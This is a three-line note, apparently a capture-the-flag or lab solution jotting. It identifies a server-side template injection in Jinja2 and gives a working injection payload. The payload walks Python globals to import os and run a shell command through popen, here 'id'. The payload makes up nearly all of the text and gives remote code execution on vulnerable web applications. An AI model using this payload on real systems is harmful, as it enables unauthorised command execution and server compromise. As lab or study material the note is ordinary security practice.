hint => SSTI
template Engin => JINJA2
1- payload injection  =>  "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
